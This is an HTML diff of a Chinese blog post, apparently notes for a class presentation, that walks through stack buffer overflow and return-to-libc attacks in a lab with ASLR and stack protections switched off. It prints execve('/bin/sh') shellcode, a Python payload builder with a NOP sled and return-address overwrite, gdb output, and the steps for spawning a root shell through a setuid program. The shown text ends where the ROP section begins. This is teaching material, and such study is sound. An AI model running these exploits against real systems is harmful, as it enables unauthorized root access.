@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="缓冲区溢出环境准备 关闭地址随机化，也叫 ASLR  cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space # 查看，0&#x3D;关闭，1&#x3D;半随机，2&#x3D;全随机sudo sh -c &#x27;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&#x27;   在 gcc 中关闭栈保护机制和栈不可执行机制，分别使用选项 -fno-stac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP">
+<meta property="og:url" content="https://ceyewan.github.io/p/354eb348.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="缓冲区溢出环境准备 关闭地址随机化，也叫 ASLR  cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space # 查看，0&#x3D;关闭，1&#x3D;半随机，2&#x3D;全随机sudo sh -c &#x27;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&#x27;   在 gcc 中关闭栈保护机制和栈不可执行机制，分别使用选项 -fno-stac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109140555711.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109141946175.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109143129111.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133512468.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133828292.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109150443688.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109151033473.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109154136084.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109161115660.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109162037679.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108234902510.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109181549899.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109104213067.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109184334028.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109201430419.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109201300490.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109204254368.png">
+<meta property="article:published_time" content="2022-11-10T14:43:51.000Z">
+<meta property="article:modified_time" content="2024-03-29T17:09:26.466Z">
+<meta property="article:author" content="ceyewan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109140555711.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/cd5eaf9.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/245267c1.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/354eb348.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/354eb348.html&text=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/354eb348.html&is_video=false&description=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP&body=Check out this article: https://ceyewan.github.io/p/354eb348.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/354eb348.html&name=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/354eb348.html&t=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">基本原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%A0%86%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">函数堆栈的结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.2.</span> <span class="toc-text">shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.3.</span> <span class="toc-text">一个缓冲区溢出的实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">被攻击的程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BE%97%E5%88%B0%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">调试程序得到一些有用的数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%86-shellcode-%E6%8F%92%E5%85%A5%E5%90%88%E9%80%82%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.3.</span> <span class="toc-text">构造字符串将 shellcode 插入合适位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BB%93%E6%9E%9C"><span class="toc-number">1.3.4.</span> <span class="toc-text">执行程序的结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#return-to-libc"><span class="toc-number">2.</span> <span class="toc-text">return to libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">2.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E8%B0%83%E7%94%A8-system-%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">得到调用 system 函数的参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%96%BD%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.</span> <span class="toc-text">实施攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">3.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%8F%E8%A8%80%E5%92%8C%E5%90%8E%E8%AE%B0"><span class="toc-number">3.2.</span> <span class="toc-text">函数的序言和后记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E6%B2%A1%E6%9C%89%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">链式调用没有参数的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E6%9C%89%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%88%E8%B7%B3%E8%BF%87%E5%BA%8F%E8%A8%80%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">链式调用有参数的函数（跳过序言）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E6%9C%89%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%88%E8%B7%B3%E8%BF%87%E5%90%8E%E8%AE%B0%EF%BC%89"><span class="toc-number">3.5.</span> <span class="toc-text">链式调用有参数的函数（跳过后记）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.6.</span> <span class="toc-text">攻击程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JOP"><span class="toc-number">4.</span> <span class="toc-text">JOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B"><span class="toc-number">4.1.</span> <span class="toc-text">攻击案例</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-10T14:43:51.000Z" class="dt-published" itemprop="datePublished">2022-11-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/linux-kernel/">linux-kernel</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ol>
+<li>关闭地址随机化，也叫 ASLR</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space <span class="comment"># 查看，0=关闭，1=半随机，2=全随机</span></span><br><span class="line">sudo sh -c <span class="string">&#x27;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>在 gcc 中关闭栈保护机制和栈不可执行机制，分别使用选项 <code>-fno-stack-protector</code> 和 <code>-z execstack</code></li>
+<li>我们只考虑 32 位程序，因此，在编译的时候使用 <code>-m32</code> 选项指定生成 32 位程序。</li>
+<li>将有安全机制的 sh 链接到没有安全机制的 zsh，并且将被攻击的程序设为 setuid 程序。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -sf /bin/zsh /bin/sh</span><br><span class="line">sudo <span class="built_in">chown</span> root attack</span><br><span class="line">sudo <span class="built_in">chmod</span> 4755 attack</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><h4 id="函数堆栈的结构"><a href="#函数堆栈的结构" class="headerlink" title="函数堆栈的结构"></a>函数堆栈的结构</h4><p>对于这样的一个函数，堆栈如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123; </span><br><span class="line">	<span class="type">int</span> x[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109140555711.png" alt="image-20221109140555711"></p>
+<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>我们看下面这个程序，调用了 execve() 函数，运行了 sh，我们可以将其编译得到二进制程序，拿到核心的那段二进制。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">	name[<span class="number">0</span>] = <span class="string">&quot;bin/sh&quot;</span>; name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">	execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如下所示：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span>；</span><br></pre></td></tr></table></figure>
+
+<p>我们可以调用这个二进制代码，就够拿到 root 权限的 shell。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())shellcode;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109141946175.png" alt="image-20221109141946175"></p>
+<h3 id="一个缓冲区溢出的实例"><a href="#一个缓冲区溢出的实例" class="headerlink" title="一个缓冲区溢出的实例"></a>一个缓冲区溢出的实例</h3><h4 id="被攻击的程序"><a href="#被攻击的程序" class="headerlink" title="被攻击的程序"></a>被攻击的程序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="comment">// Has a buffer overflow problem </span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);       </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="调试程序得到一些有用的数据"><a href="#调试程序得到一些有用的数据" class="headerlink" title="调试程序得到一些有用的数据"></a>调试程序得到一些有用的数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;buffer</span><br><span class="line">$1 = (char (*)[100]) 0xffffcaec</span><br><span class="line">gdb-peda$ p $ebp</span><br><span class="line">$2 = (void *) 0xffffcb58</span><br><span class="line">gdb-peda$ p/d 0xffffcb58 - 0xffffcaec</span><br><span class="line">$3 = 108</span><br></pre></td></tr></table></figure>
+
+<h4 id="构造字符串将-shellcode-插入合适位置"><a href="#构造字符串将-shellcode-插入合适位置" class="headerlink" title="构造字符串将 shellcode 插入合适位置"></a>构造字符串将 shellcode 插入合适位置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode= (</span><br><span class="line">   <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line">start = <span class="number">300</span> </span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line">ret    = <span class="number">0xffffcaec</span> + start </span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line"></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<h4 id="执行程序的结果"><a href="#执行程序的结果" class="headerlink" title="执行程序的结果"></a>执行程序的结果</h4><p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109143129111.png" alt="image-20221109143129111"></p>
+<h2 id="return-to-libc"><a href="#return-to-libc" class="headerlink" title="return to libc"></a>return to libc</h2><p>对于很多栈不可执行的程序，我们无法调用自己构造的 shellcode。为了对抗不可执行栈，我们需要使用 return-to-libc 攻击。攻击者不需要可执行的栈，甚至不需要 shellcode。return-to-libc 攻击通过将程序的控制权跳转到系统自己的可执行代码，例如在 libc 库中的 system() 函数，来实现攻击。</p>
+<p>也就是说，这种攻击方法可以使用于编译时没有 <code>-z execstack</code> 选项的程序。</p>
+<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ol>
+<li>被攻击代码：</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer[] inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer value inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)framep);</span><br><span class="line">    <span class="comment">// Has a buffer overflow problem</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> input[<span class="number">1000</span>];</span><br><span class="line">   FILE *badfile;</span><br><span class="line">   badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">int</span> length = fread(input, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1000</span>, badfile);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Address of input[] inside main():  0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) input);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input size: %d\n&quot;</span>, length);</span><br><span class="line">   bof(input);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>调试程序，得到一些 libc 库函数的地址：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e0e360 &lt;system&gt;</span><br><span class="line">gdb-peda$ p exit</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e00ec0 &lt;exit&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="得到调用-system-函数的参数"><a href="#得到调用-system-函数的参数" class="headerlink" title="得到调用 system 函数的参数"></a>得到调用 system 函数的参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> MYSHELL=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>写一个 help 函数，变出出来的可执行文件文件名应该和 retlic 一样长，输出 MYSHELL 的地址。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (shell)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -o prtenv -m32 -g help.c                           </span></span><br><span class="line"><span class="comment">// ./prtenv             </span></span><br><span class="line"><span class="comment">//     ffffdfe7</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p>我们先随便执行一下 retlic 程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Address of input[] inside main():  0xffffce00</span><br><span class="line">Input size: 300</span><br><span class="line">Address of buffer[] inside bof():  0xffffcdd0</span><br><span class="line">Frame Pointer value inside bof():  0xffffcde8</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 input 的地址和 buffer 的地址和 ebp 的值。并且可以算出 ebp 相对于 buffer 偏移了 24 字节。那么 ret 就是偏移 28 字节。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133512468.png" alt="image-20221108133512468"></p>
+<p>这样，我们用 system 的地址覆盖了 ret，在 bof 函数退出时就会去执行 system 函数，并且我们把参数放在环境变量中，然后找到了地址，传递给 system 函数，从而 system(“&#x2F;bin&#x2F;sh”) 会被执行。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133828292.png" alt="image-20221108133828292"></p>
+<p>可以看到，我们拿到了 root 权限。</p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>ROP 全称为 Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构成恶意代码。</p>
+<p>上面我们已经成功实现了调用 system 库函数。很遗憾的是，我们需要提前将 sh 链接到没有安全措施的 zsh，但是在攻击对方时，很难保证对方机器上安装了 zsh。我们可以看到，上面得到的 shell 的 uid 还是普通用户，euid 才是 root 用户。为了解决 sh 在 uid 和 euid 不相同的情况下放弃特权的情况，我们还需要调用 setuid(0) 将 uid 设为 0。</p>
+<p>ROP 技术可以帮我们实现这种连锁（调用 setuid 又调用 system）的调用。</p>
